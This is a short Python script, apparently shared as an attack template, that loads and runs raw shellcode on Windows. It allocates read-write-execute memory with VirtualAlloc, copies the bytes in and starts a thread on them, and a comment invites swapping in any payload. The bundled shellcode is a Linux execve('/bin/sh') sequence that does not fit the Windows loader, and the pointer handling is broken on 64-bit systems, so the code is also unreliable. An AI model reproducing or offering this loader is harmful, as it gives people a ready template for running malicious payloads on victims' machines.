#uthor: payloads45

import ctypes

# Define the shellcode as a byte array
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" #Replace the buffer


memory = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))

# Copy the shellcode into the allocated memory
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memory), shellcode, ctypes.c_int(len(shellcode)))
shellcode_thread = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(memory), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(shellcode_thread), ctypes.c_int(-1))
